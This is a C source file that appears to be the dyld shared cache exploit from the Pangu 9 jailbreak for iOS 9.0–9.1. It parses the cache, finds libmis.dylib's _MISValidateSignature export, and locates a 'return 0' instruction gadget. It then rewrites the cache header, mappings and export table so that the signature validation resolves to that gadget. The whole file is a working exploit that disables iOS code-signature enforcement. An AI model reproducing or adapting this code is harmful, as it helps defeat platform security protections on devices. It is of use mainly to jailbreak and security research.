/* haxx_override.c - 64bit dyld_shared_cache hack
 * This is used in pangu 9 (9.0-9.1), and fix in 9.2
 * copyright (c) kok3shidoll & Clarity
 *
 * build : gcc (-DARM64) haxx_override.c export_stuff/export_stuff.c -Iexport_stuff/ -o haxx_override
 *
 * do not abuse
 *
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <stddef.h>
#include <unistd.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include "export_stuff/export_stuff.h"
#include "plog.h"

static void fileread(FILE *fp, uint32_t offset, size_t rdsize, void* buf)
{
    if(!buf) return;
    memset(buf, 0, rdsize);
    fseek(fp, offset, SEEK_SET);
    fread(buf, rdsize, 1, fp);
}

#ifdef ARM64
static int insn_is_movz_x0_0(uint32_t *i)
{
    if (*i == 0xd2800000)
    {
        return 1;
    }
    return 0;
}

static int insn_is_movz_x2_0(uint32_t *i)
{
    if (*i == 0xd2800002)
    {
        return 1;
    }
    return 0;
}

static int insn_is_ret(uint32_t *i)
{
    if (*i == 0xd65f03c0)
        return 1;
    
    return 0;
}

static int insn_is_b_64(uint32_t *i)
{
    if ((*i & 0xff000000) == 0x17000000)
        return 1;
    else
        return 0;
}
#else
static int insn_is_mov_x0_0_bx_lr(uint32_t *i)
{
    if (*i == 0x47702000)
    {
        return 1;
    }
    return 0;
}
#endif

struct dyld_cache_header
{
    char     magic[16];           // e.g. "dyld_v0    i386"
    uint32_t mappingOffset;       // file offset to first dyld_cache_mapping_info
    uint32_t mappingCount;        // number of dyld_cache_mapping_info entries
    uint32_t imagesOffset;        // file offset to first dyld_cache_image_info
    uint32_t imagesCount;         // number of dyld_cache_image_info entries
    uint64_t dyldBaseAddress;     // base address of dyld when cache was built
    uint64_t codeSignatureOffset; // file offset of code signature blob
    uint64_t codeSignatureSize;   // size of code signature blob (zero means to end of file)
    uint64_t slideInfoOffset;     // file offset of kernel slid info
    uint64_t slideInfoSize;       // size of kernel slid info
    uint64_t localSymbolsOffset;  // file offset of where local symbols are stored
    uint64_t localSymbolsSize;    // size of local symbols information
    uint8_t  uuid[16];            // unique value for each shared cache file
};

struct dyld_cache_mapping_info
{
    uint64_t address;
    uint64_t size;
    uint64_t fileOffset;
    uint32_t maxProt;
    uint32_t initProt;
};

struct dyld_cache_image_info
{
    uint64_t address;
    uint64_t modTime;
    uint64_t inode;
    uint32_t pathFileOffset;
    uint32_t pad;
};

#ifdef ARM64
#define MAGIC MH_MAGIC_64
#define HEADER mach_header_64
#define NLIST nlist_64
#else
#define MAGIC MH_MAGIC
#define HEADER mach_header
#define NLIST nlist
#endif

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("%s <in>\n", argv[0]);
        return 0;
    }
    
    char *infile = argv[1];
    
    FILE *fp = fopen(infile, "r");
    if (!fp)
    {
        ERR("opening %s", infile);
        return -1;
    }
    
    void  *header_buf       = NULL;
    size_t header_size      = 0x8000;
    size_t image_full_size  = 0;
    
    fseek(fp, 0, SEEK_END);
    image_full_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    void *fake_header_buf       = NULL;
    void *fake_data_buf         = NULL;
    void *cs_buf                = NULL;
    void *tmpBuf                = NULL;
    void *imageInfoBuf          = NULL;
    void *libmis_hd_buf         = NULL;
    void *libmis_lc_buf         = NULL;
    void *libmis_sc_buf         = NULL;
    void *libmis_dyc_buf        = NULL;
    void *libmis_dyldinfo_buf   = NULL;
    void *imageStrBuf           = NULL;
    void *sym_tab_buf           = NULL;
    
    header_buf      = malloc(header_size);
    fake_header_buf = malloc(header_size);
    fake_data_buf   = malloc(0x4000);
    cs_buf          = malloc(8);
    imageInfoBuf    = malloc(sizeof(struct dyld_cache_image_info));
    libmis_hd_buf   = malloc(sizeof(struct HEADER));
    libmis_lc_buf   = malloc(sizeof(struct load_command));
    libmis_sc_buf   = malloc(sizeof(struct symtab_command));
    libmis_dyc_buf  = malloc(sizeof(struct dyld_info_command));
    sym_tab_buf     = malloc(sizeof(struct NLIST));
    tmpBuf          = malloc(0x4000);
    
    if(   !image_full_size
       || !header_buf
       || !fake_header_buf
       || !cs_buf
       || !imageInfoBuf
       || !libmis_hd_buf
       || !libmis_lc_buf
       || !libmis_sc_buf
       || !libmis_dyc_buf
       || !sym_tab_buf
       || !tmpBuf)
    {
        ERR("allocating header");
        fclose(fp);
        return -1;
    }
    
    fileread(fp, 0, header_size, header_buf);
    
    struct dyld_cache_header *header = header_buf;
    
    DEVLOG("magic               : %s", header->magic);
    DEVLOG("mappingOffset       : %08x", header->mappingOffset);
    DEVLOG("mappingCount        : %u", header->mappingCount);
    DEVLOG("imagesOffset        : %08x", header->imagesOffset);
    DEVLOG("imagesCount         : %u", header->imagesCount);
    DEVLOG("dyldBaseAddress     : %016llx", header->dyldBaseAddress);
    DEVLOG("codeSignatureOffset : %016llx", header->codeSignatureOffset);
    DEVLOG("codeSignatureSize   : %016llx", header->codeSignatureSize);
    printf("\n");
    
    fileread(fp, header->codeSignatureOffset, 8, cs_buf);
    
    struct dyld_cache_mapping_info *mapInfo = header_buf + header->mappingOffset;
    for (int i = 0; i < header->mappingCount; i++)
    {
        DEVLOG("dyld_cache_mapping_info [%i]", i);
        DEVLOG("address    : %016llx", mapInfo->address);
        DEVLOG("size       : %016llx", mapInfo->size);
        DEVLOG("fileOffset : %016llx", mapInfo->fileOffset);
        DEVLOG("maxProt    : %08x", mapInfo->maxProt);
        DEVLOG("initProt   : %08x", mapInfo->initProt);
        mapInfo++;
        printf("\n");
    }
    mapInfo = header_buf + header->mappingOffset;
    
    const char *libmis = "/usr/lib/libmis.dylib";
    const char *searchStr8 = "/System/Library/Caches/com.apple.xpc/sdk.dylib";
    
    uint64_t pathOffset = (uint64_t)memmem(header_buf, header_size, searchStr8, strlen(searchStr8));
    
    pathOffset -= (uint64_t)header_buf;
    uint64_t libmisoffset;
    
    int pathCount;
    struct dyld_cache_image_info *imageInfo = header_buf + header->imagesOffset;
    
    // haxx
    void* pos = (void*)(imageInfo);
    uint32_t infooff = (uintptr_t)(pos) - (uintptr_t)(header_buf);
    
    fileread(fp, infooff, sizeof(struct dyld_cache_image_info), imageInfoBuf);
    imageInfo = imageInfoBuf;
    
    for (int i = 0; i < header->imagesCount; i++)
    {
        DEVLOG("dyld_cache_image_info [%i]", i);
        DEVLOG("address        : %016llx", imageInfo->address);
        DEVLOG("modTime        : %016llx", imageInfo->modTime);
        DEVLOG("inode          : %016llx", imageInfo->inode);
        DEVLOG("pathFileOffset : %08x", imageInfo->pathFileOffset);
        
        // haxx
        fileread(fp, imageInfo->pathFileOffset, 255, tmpBuf);
        DEVLOG("path           : %s", (char *)tmpBuf);
        
        DEVLOG("pad            : %08x", imageInfo->pad);
        printf("\n");
        if (strcmp(libmis, (char *)tmpBuf) == 0)
        {
            libmisoffset = imageInfo->pathFileOffset;
        }
        if (imageInfo->pathFileOffset == pathOffset)
        {
            pathCount = i;
        }
        
        infooff += sizeof(struct dyld_cache_image_info);
        fileread(fp, infooff, sizeof(struct dyld_cache_image_info), imageInfoBuf);
        imageInfo = imageInfoBuf;
    }
    
    imageInfo = header_buf + header->imagesOffset;
    printf("\n");
    
    LOG("path name  : %s", libmis);
    LOG("libmisOffset : %08llx", libmisoffset);
    LOG("pathCount  : %d", pathCount);
    
    uint32_t libmisheaderloc;
    uint64_t imgoffset = libmisoffset;
    // go back until we get to the start of the dylib header
    while (1)
    {
        fileread(fp, imgoffset, 4, tmpBuf);
        uint32_t *value = (uint32_t *)tmpBuf;
        if (value[0] == MAGIC)
        {
            libmisheaderloc = imgoffset;
            break;
        }
        imgoffset -= 4;
    }
    
    LOG("%s HEADER: %16llx", libmis, mapInfo->address + libmisheaderloc);
    
    
    
    fileread(fp, libmisheaderloc, sizeof(struct HEADER), libmis_hd_buf);
    struct HEADER *libmisheader = libmis_hd_buf;
    
    uint32_t offset = 0;
    uint64_t MISValidateSignature;
    uint64_t libmisExportTableOffset;
    uint32_t libmisExportTableSize;
    for (int i = 0; i < libmisheader->ncmds; i++)
    {
        fileread(fp, libmisheaderloc + sizeof(struct HEADER) + offset, sizeof(struct load_command), libmis_lc_buf);
        struct load_command *lc = libmis_lc_buf;
        if (lc->cmd == LC_SYMTAB)
        {
            fileread(fp, libmisheaderloc + sizeof(struct HEADER) + offset, sizeof(struct symtab_command), libmis_sc_buf);
            struct symtab_command *stc = libmis_sc_buf; //(struct symtab_command *)lc;
            uint64_t stringtablesize = stc->strsize;
            uint64_t symentries = stc->nsyms;
            for (int i = 0; i < symentries; ++i)
            {
                fileread(fp, (stc->symoff + sizeof(struct NLIST) * i), sizeof(struct NLIST), sym_tab_buf);
                struct NLIST *nl = (struct NLIST *)(sym_tab_buf);
                if ((nl->n_type & N_TYPE) != N_UNDF)
                {
                    fileread(fp, stc->stroff + nl->n_un.n_strx, strlen("_MISValidateSignature") + 1, tmpBuf);
                    char *symbol = (char *)(tmpBuf);
                    if (strcmp(symbol, "_MISValidateSignature") == 0)
                    {
                        LOG("found");
                        MISValidateSignature = nl->n_value;
                    }
                }
            }
        }
        if (lc->cmd == LC_DYLD_INFO_ONLY)
        {
            fileread(fp, libmisheaderloc + sizeof(struct HEADER) + offset, sizeof(struct dyld_info_command), libmis_dyc_buf);
            struct dyld_info_command *dyc = libmis_dyc_buf; //(struct dyld_info_command *)lc;
            LOG("%s EXPORT TABLE     : %08x", libmis, dyc->export_off);
            LOG("%s EXPORT TABLE SIZE: %08x", libmis, dyc->export_size);
            libmisExportTableOffset = dyc->export_off;
            libmisExportTableSize = dyc->export_size;
        }
        offset += lc->cmdsize;
    }
    LOG("_MISValidateSignature: %08llx", MISValidateSignature);
    // find mov x0 #0 ret gadget
    //  0xd2800000 -> 00 00 80 d2
    //  0xd2800002 -> 02 00 80 D2
    imgoffset = libmisoffset;
    uint64_t MOV_R0_0__BX_LR;
    
    while (1)
    {
        imgoffset++;
        fileread(fp, imgoffset, 8, tmpBuf);
#ifdef ARM64
        if (insn_is_movz_x0_0(tmpBuf))
        {
            if (insn_is_ret(tmpBuf + 4))
            {
                MOV_R0_0__BX_LR = mapInfo->address + imgoffset;
                break;
            }
        }
#else
        if (insn_is_mov_x0_0_bx_lr(tmpBuf))
        {
            MOV_R0_0__BX_LR = mapInfo->address + imgoffset;
            break;
        }
#endif
    }
    
    LOG("RET0 GADGET: %08llx", MOV_R0_0__BX_LR);
    
    uint16_t mvsdataaddressoffset;
    fileread(fp, libmisExportTableOffset, 0x4000, tmpBuf);
    findInExportTable(tmpBuf, tmpBuf, "", &mvsdataaddressoffset);
    LOG("da real offset: %x", mvsdataaddressoffset);
    uint64_t exportTableOffset = libmisExportTableOffset + mvsdataaddressoffset;
    LOG("exportTableOffset: %08llx", exportTableOffset);
    
    
    uint64_t toreplace = MOV_R0_0__BX_LR - (mapInfo->address + libmisheaderloc);
    printf("[haxx:val] NEW VALUE: ");
    uint8_t newval[2] = {};
    EncodeUleb128(toreplace, newval);
    for (int i = 0; i < 2; ++i)
    {
        printf("%02x", *(newval + i));
    }
    printf("\n");
    
    // 16k?
#ifdef ARM64
    uint64_t pad = 0x4000;
#else
    uint64_t pad = 0x4000;
#endif
    uint64_t dataSize = 0x4000;
    
    uint64_t baseAddr = mapInfo->address;
    uint64_t imageInfo_baseAddr = imageInfo->address;
    uint64_t headerSize = imageInfo_baseAddr - baseAddr;
    size_t newSize = (image_full_size & ~0x3fff) + pad + headerSize + dataSize;
    
    LOG("baseAddr       : %016llx", mapInfo->address);
    LOG("imageInfo_base : %016llx", imageInfo_baseAddr);
    LOG("headerSize     : %016llx", headerSize);
    LOG("size           : %zx -> %zx", image_full_size, newSize);
    printf("\n");
    
    /* copy fakeheader */
#ifdef ARM64
#define MASK 0x3fff
#else
#define MASK 0x3fff
#endif
    uint64_t newHeaderOffset = ((image_full_size & ~MASK) + pad);
    LOG("memcpy::header [sz: %016llx] : %016llx -> %016llx", headerSize, (uint64_t)0, newHeaderOffset);
    //memcpy(newBuf + newHeaderOffset, buf, headerSize); // ios8_haxx: headerSize == 0x8000
    memcpy(fake_header_buf, header_buf, header_size);
    
    /* copy fakedata */
    uint64_t dataOffset = (exportTableOffset & ~MASK);
    uint64_t newDataOffset = ((image_full_size & ~0x3fff) + pad + headerSize);
    LOG("memcpy::data   [sz: %016llx] : %016llx -> %016llx", dataSize, dataOffset, newDataOffset);
    //memcpy(newBuf + newDataOffset, buf + dataOffset, dataSize);
    fileread(fp, dataOffset, 0x4000, tmpBuf);
    memcpy(fake_data_buf, tmpBuf, 0x4000);
    printf("\n");
    
    /* header haxx */
    
    // 1, mappingCount += 3
    uint32_t newCount = header->mappingCount + 3;
    LOG("RemapHeader1::newCount: %08x -> %08x", header->mappingCount, newCount);
    *(uint32_t *)(fake_header_buf + offsetof(struct dyld_cache_header, mappingCount)) = newCount;
    printf("\n");
    
    // 2, imagesOffset = imagesOffset + 3*sizeof(struct dyld_cache_mapping_info)
    uint32_t newImgOffset = header->imagesOffset + 3 * sizeof(struct dyld_cache_mapping_info);
    LOG("RemapHeader2::newImgOffset: %08x -> %08x", header->imagesOffset, newImgOffset);
    *(uint32_t *)(fake_header_buf + offsetof(struct dyld_cache_header, imagesOffset)) = newImgOffset;
    printf("\n");
    
    // 3, remap header
    
    // flags
#define F_R (1)
#define F_W (2)
#define F_X (4)
    
    uint64_t nextBase;
    uint64_t nextSize;
    uint64_t nextOffset;
    uint64_t tableBaseSize;
    
    // dyld_cache_mapping_info[i]
    for (int i = 0; i < newCount; i++)
    {
        LOG("RemapHeader3::dyld_cache_mapping_info [%i]", i);
        
        if (i == 0)
        {
            nextBase = mapInfo->address + headerSize;
            nextSize = mapInfo->size - headerSize;
            nextOffset = headerSize;
            
            LOG("address    : %016llx", mapInfo->address);
            
            LOG("size       : %016llx -> %016llx", mapInfo->size, headerSize);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = headerSize;
            
            LOG("fileOffset : %016llx -> %016llx", mapInfo->fileOffset, newHeaderOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = newHeaderOffset;
            
            LOG("maxProt    : %08x -> %08x", mapInfo->maxProt, (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (F_R);
            
            LOG("initProt   : %08x -> %08x", mapInfo->initProt, (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (F_R);
        }
        
        if (i == 1)
        {
            LOG("address    : %016llx -> %016llx", mapInfo->address, nextBase);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, address))
                          ) = nextBase;
            
            LOG("size       : %016llx -> %016llx", mapInfo->size, nextSize);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = nextSize;
            
            LOG("fileOffset : %016llx -> %016llx", mapInfo->fileOffset, nextOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = nextOffset;
            
            LOG("maxProt    : %08x -> %08x", mapInfo->maxProt, (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (mapInfo - 1)->maxProt;
            
            LOG("initProt   : %08x -> %08x", mapInfo->initProt, (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (mapInfo - 1)->maxProt;
        }
        
        if (i == 2)
        {
            LOG("address    : %016llx -> %016llx", mapInfo->address, (mapInfo - 1)->address);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, address))
                          ) = (mapInfo - 1)->address;
            
            LOG("size       : %016llx -> %016llx", mapInfo->size, (mapInfo - 1)->size);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = (mapInfo - 1)->size;
            
            LOG("fileOffset : %016llx -> %016llx", mapInfo->fileOffset, (mapInfo - 1)->fileOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = (mapInfo - 1)->fileOffset;
            
            LOG("maxProt    : %08x -> %08x", mapInfo->maxProt, (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (mapInfo - 1)->maxProt;
            
            LOG("initProt   : %08x -> %08x", mapInfo->initProt, (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (mapInfo - 1)->maxProt;
        }
        
        if (i == 3)
        {
            nextBase = (mapInfo - 1)->address + dataOffset - (mapInfo - 1)->fileOffset;
            nextSize = dataOffset - (mapInfo - 1)->fileOffset;
            LOG("address    : %016llx", (mapInfo - 1)->address);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, address))
                          ) = (mapInfo - 1)->address;
            
            LOG("size       : %016llx", dataOffset - (mapInfo - 1)->fileOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = dataOffset - (mapInfo - 1)->fileOffset;
            tableBaseSize = dataOffset - (mapInfo - 1)->fileOffset;
            
            LOG("fileOffset : %016llx", (mapInfo - 1)->fileOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = (mapInfo - 1)->fileOffset;
            
            LOG("maxProt    : %08x", (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (mapInfo - 1)->maxProt;
            
            LOG("initProt   : %08x", (mapInfo - 1)->maxProt);
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (mapInfo - 1)->maxProt;
        }
        
        if (i == 4)
        {
            LOG("address    : %016llx", nextBase);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, address))
                          ) = nextBase;
            
            nextBase = nextBase + dataSize;
            
            LOG("size       : %016llx", dataSize);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = dataSize;
            
            LOG("fileOffset : %016llx", newDataOffset);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = newDataOffset;
            
            LOG("maxProt    : %08x", (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (F_R);
            
            LOG("initProt   : %08x", (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (F_R);
        }
        
        if (i == 5)
        {
            LOG("address    : %016llx", nextBase);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, address))
                          ) = nextBase;
            
            LOG("size       : %016llx", (mapInfo - 3)->size - dataSize - nextSize);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, size))
                          ) = (mapInfo - 3)->size - dataSize - nextSize;
            
            LOG("fileOffset : %016llx", (mapInfo - 3)->fileOffset + dataSize + nextSize);
            *(uint64_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                          ) = (mapInfo - 3)->fileOffset + dataSize + nextSize;
            
            LOG("maxProt    : %08x", (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, maxProt))
                          ) = (F_R);
            
            LOG("initProt   : %08x", (F_R));
            *(uint32_t *)(fake_header_buf
                          + (header->mappingOffset)
                          + (i * sizeof(struct dyld_cache_mapping_info))
                          + (offsetof(struct dyld_cache_mapping_info, initProt))
                          ) = (F_R);
        }
        
        mapInfo++;
        printf("\n");
    }
    mapInfo = header_buf + header->mappingOffset;
    printf("\n");
    
    // 4, move dyld_cache_image_info
    LOG("RemapHeader4::moving dyld_cache_image_info[%016llx] %08x -> %08x", headerSize - newImgOffset, header->imagesOffset, newImgOffset);
    memcpy(fake_header_buf + newImgOffset, header_buf + header->imagesOffset, headerSize - newImgOffset);
    printf("\n");
    
    // 5, fix dyld_cache_image_info
    uint32_t addSize = newImgOffset - header->imagesOffset;
    printf("dyld_cache_image_info Point: %016lx\n", header->imagesOffset + (pathCount * sizeof(struct dyld_cache_image_info)));
    for (int i = pathCount; i < header->imagesCount; i++)
    {
        LOG("RemapHeader5::imageInfo->pathFileOffset [%d]: %08x -> %08x",
            i,
            (imageInfo + i)->pathFileOffset,
            (imageInfo + i)->pathFileOffset + addSize);
        
        *(uint32_t *)(fake_header_buf
                      + (header->imagesOffset)
                      + (i * sizeof(struct dyld_cache_image_info))
                      + (offsetof(struct dyld_cache_image_info, pathFileOffset)) + addSize
                      ) = (imageInfo + i)->pathFileOffset + addSize;
    }
    printf("\n");
    
    // 6, codesignature
    uint32_t cs_length = __builtin_bswap32(*(uint32_t *)(cs_buf + 4));
    LOG("cs_length: %08x", cs_length);
    LOG("codeSignatureSize: %016llx -> %016llx", header->codeSignatureSize, (uint64_t)cs_length);
    *(uint64_t *)(fake_header_buf
                  + offsetof(struct dyld_cache_header, codeSignatureSize)
                  ) = cs_length;
    printf("\n");
    
    // 7, change export table
    fileread(fp, exportTableOffset, 0x4000, tmpBuf);
    uint16_t origTable = *(uint16_t *)(tmpBuf);
    LOG("origTable: %04x", origTable);
    
    uint64_t patch_point = (exportTableOffset
                            - ((mapInfo + 2)->fileOffset + tableBaseSize)
                            + newDataOffset);
    
    LOG("original_point     : %016llx", exportTableOffset);
    LOG("patch_point        : %016llx", patch_point);
    if(patch_point <= newDataOffset)
    {
        ERR("WTF?!");
    }
    uint64_t patch_point_delta = patch_point - newDataOffset;
    LOG("patch_point_delta  : %016llx", patch_point_delta);
    *(uint8_t *)(fake_data_buf + patch_point_delta) = newval[0];
    *(uint8_t *)(fake_data_buf + patch_point_delta + 1) = newval[1];
    LOG("newTable: %02x%02x", newval[0], newval[1]);
    printf("\n");
    
    // close fp
    fclose(fp);
    
    // re-open
    LOG("write: %s", infile);
    FILE *out = fopen(infile, "r+");
    if (!out)
    {
        ERR("opening %s", infile);
        return -1;
    }
    
    // magical haxx
    truncate(infile, newSize);
    
    // write!
    // header -> fakeheader
    fseek(out, 0, SEEK_SET);
    fwrite(fake_header_buf, headerSize, 1, out);
    
    // write!!
    // newmap1 -> original header
    fseek(out, newHeaderOffset, SEEK_SET);
    fwrite(header_buf, headerSize, 1, out);
    
    // write!!!
    // newmap2 -> fakedata
    fseek(out, newDataOffset, SEEK_SET);
    fwrite(fake_data_buf, dataSize, 1, out);
    
    fflush(out);
    fclose(out);
    
    // free
    if(header_buf) free(header_buf);
    if(fake_header_buf) free(fake_header_buf);
    if(fake_data_buf) free(fake_data_buf);
    if(cs_buf) free(cs_buf);
    if(imageInfoBuf) free(imageInfoBuf);
    if(libmis_hd_buf) free(libmis_hd_buf);
    if(libmis_lc_buf) free(libmis_lc_buf);
    if(libmis_sc_buf) free(libmis_sc_buf);
    if(libmis_dyc_buf) free(libmis_dyc_buf);
    if(sym_tab_buf) free(sym_tab_buf);
    if(tmpBuf) free(tmpBuf);
    
    return 0;
}
